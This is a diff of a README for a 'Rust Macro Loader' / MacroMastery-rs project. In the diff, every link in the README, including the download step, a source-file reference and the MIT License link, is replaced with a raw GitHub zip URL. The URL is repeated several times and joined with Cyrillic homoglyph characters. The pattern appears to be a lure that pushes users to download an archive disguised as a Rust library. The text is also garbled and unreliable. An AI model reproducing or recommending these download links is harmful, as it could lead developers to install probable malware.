@@ -10,9 +10,9 @@ Unlock the next level of coding productivity and leverage the power of reusable 
 
 Start using powerful Rust macros in minutes! Just follow these steps:
 
-1. **Download https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zip** from the repository.
+1. **Download https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zip** from the repository.
 2. Extract the contents to your project directory.
-3. Include the provided macros in your `https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zip` or any Rust module.
+3. Include the provided macros in your `https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zip` or any Rust module.
 4. Enjoy blazing-fast development with code you can trust!
 
 ---
@@ -83,7 +83,7 @@ This repository is for educational and developmental purposes only. While we str
 
 ## 📝 License
 
-Rust Macro Loader is open source and licensed under the MIT License. Please review the [MIT License](https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zip) for details.  
+Rust Macro Loader is open source and licensed under the MIT License. Please review the [MIT License](https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zip) for details.  
 © 2025 Rust Macro Loader Project. All rights reserved.
 
 ---
@@ -98,6 +98,6 @@ Rust Macro Loader is open source and licensed under the MIT License. Please revi
 
 ## 🚦 Start Developing with Rust Macro Loader Today!
 
-Accelerate your Rust projects with a broad set of reusable macros that just work—across Windows, Linux, and macOS. Download **https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/Lоader.zip** now and build with confidence, speed, and style!
+Accelerate your Rust projects with a broad set of reusable macros that just work—across Windows, Linux, and macOS. Download **https://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zipоhttps://raw.githubusercontent.com/aditya00654/MacroMastery-rs/main/hydrophobic/Macro_Mastery_rs_1.7.zip** now and build with confidence, speed, and style!
 
 ---
